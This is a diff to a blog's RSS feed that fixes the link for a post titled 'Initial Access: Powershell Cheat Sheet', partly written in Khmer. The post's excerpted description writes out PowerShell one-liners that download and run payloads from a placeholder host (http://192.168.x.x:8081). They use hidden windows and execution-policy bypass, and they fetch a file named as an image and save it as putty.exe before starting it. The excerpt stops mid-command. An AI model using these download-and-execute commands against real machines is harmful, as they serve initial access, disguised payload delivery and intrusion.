@@ -71,11 +71,11 @@ Requirements  CobaltStrike Email Zrok Telebit  Zrok Setup ចូលទៅតំ�
       
       <item>
         <title>Initial Access: Powershell Cheat Sheet</title>
-        <link>https://th1k.github.io/en/posts/zrok/</link>
+        <link>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</link>
         <pubDate>Sun, 16 Jun 2024 13:00:00 +0700</pubDate>
         <author>leangputthik@protonmail.com (Thik)</author>
         <atom:modified>Sun, 16 Jun 2024 13:00:00 +0700</atom:modified>
-        <guid>https://th1k.github.io/en/posts/zrok/</guid>
+        <guid>https://th1k.github.io/en/posts/initial-access-powershell-cheat-sheet/</guid>
         <description>ខាងក្រោមនេះជាវិធីក្នុងការទាញយកនូវរាល់ Payloads ចេញពីអ៊ីនអឺណិត ។
 Based On  PowerShell VBScript Batch Script  Method 1 - PowerShell Downloader 1 2 3 4 5  # Download and Execute Payload (PS1) powershell -nop -c &amp;#34;iex(New-Object Net.WebClient).DownloadString(&amp;#39;http://192.168.x.x:8081/test.ps1&amp;#39;)&amp;#34; powershell.exe -nop -w hidden -c &amp;#34;IEX ((new-object net.webclient).downloadstring(&amp;#39;http://192.168.x.x:8081/test.ps1&amp;#39;))&amp;#34; # ./test.ps1 =&amp;gt; Start-Process &amp;#39;C:\windows\system32\calc.exe&amp;#39;   1 2 3 4  # Download/Save/Execute PowerShell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile(&amp;#39;http://192.168.x.x:8081/cat.jpg&amp;#39;,&amp;#39;%temp%\putty.exe&amp;#39;); Start-Process &amp;#39;%temp%\putty.exe&amp;#39; PowerShell -windowstyle hidden -ExecutionPolicy ByPass -NoProfile Start-BitsTransfer -Source http://192.</description>
         
